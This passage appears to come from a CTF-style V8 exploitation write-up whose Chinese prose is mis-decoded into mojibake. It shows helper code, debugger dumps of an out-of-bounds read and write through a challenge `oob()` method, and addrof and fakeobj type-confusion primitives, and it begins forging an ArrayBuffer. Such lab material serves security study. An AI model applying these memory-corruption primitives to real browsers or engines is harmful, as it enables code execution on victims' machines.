id="oobä½¿ç”¨"><a href="#oobä½¿ç”¨" class="headerlink" title="oobä½¿ç”¨"></a>oobä½¿ç”¨</h3><p>é¦–å…ˆå†™è¿‡double_arrå’Œobj_arrï¼Œu2d d2u gc hexè¿™äº›éƒ½æ˜¯å·¥å…·functionï¼Œåé¢ä¼šç”¨åˆ°</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">const</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buf);</span><br><span class="line"><span class="comment">// Floating point to 64-bit unsigned integer</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="title class_">Array</span>.<span class="title function_">from</span>(u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64-bit unsigned integer to Floating point</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        u32.<span class="title function_">set</span>(tmp);</span><br><span class="line">        <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 32-bit unsigned integer to hex **string**</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">let</span> obj_arr = [&#123;&#125;]</span><br><span class="line">double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);<span class="comment">//é‡æ’æ¸…ç©ºä¸€ä¸‹</span></span><br><span class="line">obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">double_arr.<span class="title function_">oob</span>(); <span class="comment">//è¶Šç•Œè¯»äº†ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œä»¥doubleå€¼è¿”å›</span></span><br></pre></td></tr></table></figure></div><blockquote><p><code>array.splice(0)</code> è¡¨ç¤ºä»æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹ï¼Œåˆ é™¤æ‰€æœ‰å…ƒç´ ã€‚å®ƒæ˜¯ç”¨äºæ¸…ç©ºæ•°ç»„æˆ–æˆªå–æ•°ç»„å†…å®¹çš„ä¸€ç§ç®€ä¾¿æ–¹æ³•ï¼ŒåŒæ—¶è¿”å›è¢«åˆ é™¤çš„å…ƒç´ é›†åˆã€‚</p></blockquote><p>éªŒè¯ä¸€ä¸‹è¶Šç•Œè¯»</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(double_arr);</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">d2u</span>(double_arr.<span class="title function_">oob</span>()))); </span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x39deae34e609</span> &lt;<span class="title class_">JSArray</span>[<span class="number">1</span>]&gt;</span><br><span class="line"><span class="number">0x3d28495c2ed9</span></span><br><span class="line">pwndbg&gt;  job <span class="number">0x39deae34e609</span></span><br><span class="line"><span class="number">0x39deae34e609</span>: [<span class="title class_">JSArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x3d28495c2ed9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>] </span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x11ebfedd1111</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x39deae34e5f1</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; [<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">1</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x09dc5a3c0c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x3d62f96401a9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x39deae34e5f1</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt;  x/20gx <span class="number">0x39deae34e609</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x39deae34e608</span>:<span class="number">0x00003d28495c2ed9</span><span class="number">0x000009dc5a3c0c71</span></span><br><span class="line"><span class="number">0x39deae34e618</span>:<span class="number">0x000039deae34e5f1</span>(elements)<span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x39deae34e628</span>:<span class="number">0x000009dc5a3c0561</span><span class="number">0x00003d28495c2ed9</span></span><br><span class="line"><span class="number">0x39deae34e638</span>:<span class="number">0x000009dc5a3c12c9</span><span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x39deae34e648</span>:<span class="number">0x0000040000000000</span><span class="number">0x00003d28495c2d99</span></span><br><span class="line"><span class="number">0x39deae34e658</span>:<span class="number">0x000009dc5a3c0c71</span><span class="number">0x000039deae34e671</span></span><br><span class="line"><span class="number">0x39deae34e668</span>:<span class="number">0x0000000200000000</span><span class="number">0x000009dc5a3c0801</span></span><br><span class="line"><span class="number">0x39deae34e678</span>:<span class="number">0x0000000400000000</span><span class="number">0x495c2ed900000000</span></span><br><span class="line"><span class="number">0x39deae34e688</span>:<span class="number">0x00003d2800000000</span><span class="number">0x000009dc5a3c05b1</span></span><br><span class="line"><span class="number">0x39deae34e698</span>:<span class="number">0x000009dc5a3c05b1</span><span class="number">0x00003d28495c3ab9</span></span><br><span class="line">pwndbg&gt;  x/20gx <span class="number">0x39deae34e5f1</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x39deae34e5f0</span>:<span class="number">0x000009dc5a3c14f9</span><span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x39deae34e600</span>:<span class="number">0x3ff199999999999a</span>(<span class="number">1.1</span>)<span class="number">0x00003d28495c2ed9</span>(map*)</span><br><span class="line"><span class="number">0x39deae34e610</span>:<span class="number">0x000009dc5a3c0c71</span><span class="number">0x000039deae34e5f1</span></span><br><span class="line"><span class="number">0x39deae34e620</span>:<span class="number">0x0000000100000000</span><span class="number">0x000009dc5a3c0561</span></span><br><span class="line"><span class="number">0x39deae34e630</span>:<span class="number">0x00003d28495c2ed9</span><span class="number">0x000009dc5a3c12c9</span></span><br><span class="line"><span class="number">0x39deae34e640</span>:<span class="number">0x0000000100000000</span><span class="number">0x0000040000000000</span></span><br><span class="line"><span class="number">0x39deae34e650</span>:<span class="number">0x00003d28495c2d99</span><span class="number">0x000009dc5a3c0c71</span></span><br><span class="line"><span class="number">0x39deae34e660</span>:<span class="number">0x000039deae34e671</span><span class="number">0x0000000200000000</span></span><br><span class="line"><span class="number">0x39deae34e670</span>:<span class="number">0x000009dc5a3c0801</span><span class="number">0x0000000400000000</span></span><br><span class="line"><span class="number">0x39deae34e680</span>:<span class="number">0x495c2ed900000000</span><span class="number">0x00003d2800000000</span></span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ä»¥å‘ç°oobè¿”å›çš„æ˜¯map*ï¼ŒåŒæ—¶åœ¨å†…å­˜å¸ƒå±€ä¸­ï¼Œä¹Ÿæ˜¯elementså…ƒç´ 1.1çš„åä¸€ä¸ª</p></blockquote><p>å†è¯•è¯•è¶Šç•Œå†™ï¼Œoobéœ€è¦ä¼ å‚</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(double_arr);</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">d2u</span>(double_arr.<span class="title function_">oob</span>(<span class="number">1</span>)))); </span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x1f2d236ce609</span> &lt;<span class="title class_">JSArray</span>[<span class="number">1</span>]&gt;</span><br><span class="line"><span class="number">0x7ff8000000000000</span></span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x1f2d236ce609</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x1f2d236ce608</span>:<span class="number">0x3ff0000000000000</span>(doubleå€¼çš„<span class="number">1</span>)<span class="number">0x00001e25c1480c71</span></span><br><span class="line"><span class="number">0x1f2d236ce618</span>:<span class="number">0x00001f2d236ce5f1</span><span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x1f2d236ce628</span>:<span class="number">0x00001e25c14812c9</span><span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x1f2d236ce638</span>:<span class="number">0x0000040000000000</span><span class="number">0x0000321e94f82d99</span></span><br><span class="line"><span class="number">0x1f2d236ce648</span>:<span class="number">0x00001e25c1480c71</span><span class="number">0x00001f2d236ce661</span></span><br><span class="line"><span class="number">0x1f2d236ce658</span>:<span class="number">0x0000000200000000</span><span class="number">0x00001e25c1480801</span></span><br><span class="line"><span class="number">0x1f2d236ce668</span>:<span class="number">0x0000000400000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x1f2d236ce678</span>:<span class="number">0x7ff8000000000000</span><span class="number">0x00001e25c14805b1</span></span><br><span class="line"><span class="number">0x1f2d236ce688</span>:<span class="number">0x00001e25c14805b1</span><span class="number">0x0000321e94f83ab9</span></span><br><span class="line"><span class="number">0x1f2d236ce698</span>:<span class="number">0x00001e25c1480c71</span><span class="number">0x00001e25c1480c71</span></span><br></pre></td></tr></table></figure></div><blockquote><p>ç›´æ¥æŠŠmap*æ”¹æˆäº†1ï¼Œä¹Ÿå°±æ˜¯è¯´ç»™oobä¼ çš„å‚æ•°ä¼šå‘åè¦†ç›–ä¸€ä¸ªå…ƒç´ ï¼Œåˆšå¥½å¯¹åº”è¿™ä¸ª<code>map*</code></p><p>ğŸ¤”è¿™é‡Œå°±æœ‰ä¸ªåˆ©ç”¨ç‚¹ï¼Œå¯ä»¥æ„é€ ä¸€ä¸ªdouble arrayï¼Œç„¶åç”¨oobæŠŠå®ƒçš„<code>map*</code> leakå‡ºæ¥ï¼Œåé¢å†æ„é€ ä¸€ä¸ªobject arrayï¼Œåˆ©ç”¨oobä¼ å‚è¶Šç•Œå†™çš„ç‰¹æ€§ï¼ŒæŠŠobject arrayçš„<code>map*</code>è¦†ç›–æˆå‰é¢leakçš„double arrayçš„<code>map*</code>,å®ç°ä¸€ä¸ªobject array â€“&gt; double arrayçš„ç±»å‹æ··æ·†</p></blockquote><h3 id="åŸè¯­æ„é€ "><a href="#åŸè¯­æ„é€ " class="headerlink" title="åŸè¯­æ„é€ "></a>åŸè¯­æ„é€ </h3><p>leakä»»æ„objectçš„address</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj_param</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">    <span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">    double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr[<span class="number">0</span>] = obj_param;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(double_arr.<span class="title function_">oob</span>());<span class="comment">//æ›¿æ¢map*</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(obj_arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>å…¶å®å°±æ˜¯åˆ©ç”¨ä¸Šé¢è¯´çš„trickï¼ŒæŠŠè¦leakåœ°å€çš„objectå…ˆå­˜åˆ°object arrayä¸­ï¼Œç„¶åæŠŠobject arrayæ··æ·†æˆdouble arrayï¼Œè¿™æ ·åé¢è¯»å–elementsçš„æ—¶å€™å°±ä¼šä»¥double arrayçš„æ–¹å¼ç›´æ¥è¿”å›(è¿™æ ·å°±æ˜¯è¿”å›address)ï¼Œå°±ä¸ä¼šæŒ‰åŸæ¥object arrayçš„æ–¹å¼(æŒ‡é’ˆè§£å¼•ç”¨ç„¶åâ€¦)</p></blockquote><p>ä¹Ÿå¯ä»¥åè¿‡æ¥ä¼ªé€ ä»»æ„å¯¹è±¡ï¼Œä¼ å…¥ä»»æ„åœ°å€ï¼Œå­˜åˆ°double arrayä¸­ï¼ŒæŠŠdouble arrayæ··æ·†æˆobject arrayï¼Œè¿™æ ·å†è®¿é—®åˆšåˆšä¼ å…¥çš„åœ°å€ï¼Œå°±ä¼šè¢«å½“ä½œHeapObject Pointeræ¥è§£æ</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fakeobj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">    <span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">    double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    double_arr[<span class="number">0</span>] = addr;</span><br><span class="line">    double_arr.<span class="title function_">oob</span>(obj_arr.<span class="title function_">oob</span>());<span class="comment">//æ›¿æ¢map*</span></span><br><span class="line">    <span class="keyword">return</span> double_arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>ä¹‹åè¿˜éœ€è¦ä¼ªé€ objectå¯¹åº”çš„å†…å­˜å¸ƒå±€ï¼Œå› æ­¤éœ€è¦äº†è§£map*ç»“æ„</p></blockquote><p>å›é¡¾ä¸€ä¸‹mapçš„ç»“æ„ï¼Œç¬¬äºŒä¸ªintå€¼æ¯”è¾ƒé‡è¦ï¼Œä»£è¡¨äº†type</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// +----+----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Int           | The second int field                        |</span></span><br><span class="line"><span class="comment">//  `---+----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Short    | [instance_type]                             |ğŸŒŸğŸŒŸğŸŒŸ</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [bit_field]                                 |</span></span><br><span class="line"><span class="comment">//      |          |   - has_non_instance_prototype (bit 0)      |</span></span><br><span class="line"><span class="comment">//      |          |   - is_callable (bit 1)                     |</span></span><br><span class="line"><span class="comment">//      |          |   - has_named_interceptor (bit 2)           |</span></span><br><span class="line"><span class="comment">//      |          |   - has_indexed_interceptor (bit 3)         |</span></span><br><span class="line"><span class="comment">//      |          |   - is_undetectable (bit 4)                 |</span></span><br><span class="line"><span class="comment">//      |          |   - is_access_check_needed (bit 5)          |</span></span><br><span class="line"><span class="comment">//      |          |   - is_constructor (bit 6)                  |</span></span><br><span class="line"><span class="comment">//      |          |   - has_prototype_slot (bit 7)              |</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [bit_field2]                                |</span></span><br><span class="line"><span class="comment">//      |          |   - is_extensible (bit 0)                   |</span></span><br><span class="line"><span class="comment">//      |          |   - is_prototype_map (bit 1)                |</span></span><br><span class="line"><span class="comment">//      |          |   - is_in_retained_map_list (bit 2)         |</span></span><br><span class="line"><span class="comment">//      |          |   - elements_kind (bits 3..7)               |</span></span><br><span class="line"><span class="comment">// +----+----------+---------------------------------------------+</span></span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ä»¥ä¼ªé€ ä¸€ä¸ªmapï¼Œç„¶åæ”¹<code>instance_type</code>ï¼Œè¿™æ ·å°±èƒ½ä¼ªé€ ä»»æ„ç±»å‹çš„objectäº†</p></blockquote><h3 id="ä¼ªé€ objectä¾‹å­ğŸŒ°"><a href="#ä¼ªé€ objectä¾‹å­ğŸŒ°" class="headerlink" title="ä¼ªé€ objectä¾‹å­ğŸŒ°"></a>ä¼ªé€ objectä¾‹å­ğŸŒ°</h3><p>ä¹‹å‰æåˆ°ArrayBufferå¯ä»¥é€šè¿‡æ”¹backing storeçš„å¤§å°æ¥å®ç°ä»»æ„åœ°å€è¯»å†™ï¼Œå› æ­¤è¿™é‡Œå¯ä»¥å°è¯•ä¼ªé€ ä¸€ä¸ªArrayBuffer,ä¼ªé€ çš„è¯è‚¯å®šéœ€è¦map*ï¼Œè¿™é‡Œå…ˆçœ‹ä¸€ä¸ªæ­£å¸¸çš„ArrayBuffer</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ab =<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(ab);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x28f3b7c4e899</span> &lt;<span class="title class_">ArrayBuffer</span> map = <span class="number">0xda8501c21b9</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x28f3b7c4e899</span></span><br><span class="line"><span class="number">0x28f3b7c4e899</span>: [<span class="title class_">JSArrayBuffer</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x0da8501c21b9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x20729294e981</span> &lt;<span class="title class_">Object</span> map = <span class="number">0xda8501c2209</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x37f811f00c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - embedder <span class="attr">fields</span>: <span class="number">2</span></span><br><span class="line"> - <span class="attr">backing_store</span>: <span class="number">0x55879d7411e0</span></span><br><span class="line"> - <span class="attr">byte_length</span>: <span class="number">32</span></span><br><span class="line"> - detachable</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x37f811f00c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    <span class="number">0</span>, aligned <span class="attr">pointer</span>: (nil)</span><br><span class="line">    <span class="number">0</span>, aligned <span class="attr">pointer</span>: (nil)</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x28f3b7c4e899</span>-<span class="number">1</span> <span class="comment">//çœ‹çœ‹ArrayBuffer</span></span><br><span class="line"><span class="number">0x28f3b7c4e898</span>:<span class="number">0x00000da8501c21b9</span>(map*)<span class="number">0x000037f811f00c71</span>(properties)</span><br><span class="line"><span class="number">0x28f3b7c4e8a8</span>:<span class="number">0x000037f811f00c71</span>(elements)<span class="number">0x0000000000000020</span>(byte_length)</span><br><span class="line"><span class="number">0x28f3b7c4e8b8</span>:<span class="number">0x000055879d7411e0</span>(<span class="title class_">BackingStore</span>)<span class="number">0x0000000000000002</span>(embedder fields)</span><br><span class="line"><span class="number">0x28f3b7c4e8c8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e8d8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e8e8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e8f8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e908</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e918</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e928</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x0da8501c21b9</span> </span><br><span class="line"><span class="number">0xda8501c21b9</span>: [<span class="title class_">Map</span>]</span><br><span class="line"> - <span class="attr">type</span>: <span class="variable constant_">JS_ARRAY_BUFFER_TYPE</span></span><br><span class="line"> - instance <span class="attr">size</span>: <span class="number">64</span></span><br><span class="line"> - inobject <span class="attr">properties</span>: <span class="number">0</span></span><br><span class="line"> - elements <span class="attr">kind</span>: <span class="variable constant_">HOLEY_ELEMENTS</span></span><br><span class="line"> - unused property <span class="attr">fields</span>: <span class="number">0</span></span><br><span class="line"> - enum <span class="attr">length</span>: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back <span class="attr">pointer</span>: <span class="number">0x37f811f004d1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line"> - prototype_validity <span class="attr">cell</span>: <span class="number">0x2aff905c0609</span> &lt;<span class="title class_">Cell</span> value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance <span class="title function_">descriptors</span> (own) #<span class="number">0</span>: <span class="number">0x37f811f00259</span> &lt;<span class="title class_">DescriptorArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - layout <span class="attr">descriptor</span>: (nil)</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x20729294e981</span> &lt;<span class="title class_">Object</span> map = <span class="number">0xda8501c2209</span>&gt;</span><br><span class="line"> - <span class="attr">constructor</span>: <span class="number">0x20729294e7e9</span> &lt;<span class="title class_">JSFunction</span> <span class="title class_">ArrayBuffer</span> (sfi = <span class="number">0x2aff905ccff9</span>)&gt;</span><br><span class="line"> - dependent <span class="attr">code</span>: <span class="number">0x37f811f002c1</span> &lt;<span class="title class_">Other</span> heap <span class="title function_">object</span> (<span class="variable constant_">WEAK_FIXED_ARRAY_TYPE</span>)&gt;</span><br><span class="line"> - construction <span class="attr">counter</span>: <span class="number">0</span></span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x0da8501c21b9</span>-<span class="number">1</span> <span class="comment">//çœ‹çœ‹map</span></span><br><span class="line"><span class="number">0xda8501c21b8</span>:<span class="number">0x000037f811f00189</span>(ä¸€ä¸ªæŒ‡å‘æ ¹<span class="title class_">Map</span>çš„<span class="title class_">Poniter</span>)<span class="number">0x1900042319080808</span>(åŒ…å«ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªint)</span><br><span class="line"><span class="number">0xda8501c21c8</span>:<span class="number">0x00000000082003ff</span><span class="number">0x000020729294e981</span></span><br><span class="line"><span class="number">0xda8501c21d8</span>:<span class="number">0x000020729294e7e9</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xda8501c21e8</span>:<span class="number">0x000037f811f00259</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xda8501c21f8</span>:<span class="number">0x000037f811f002c1</span><span 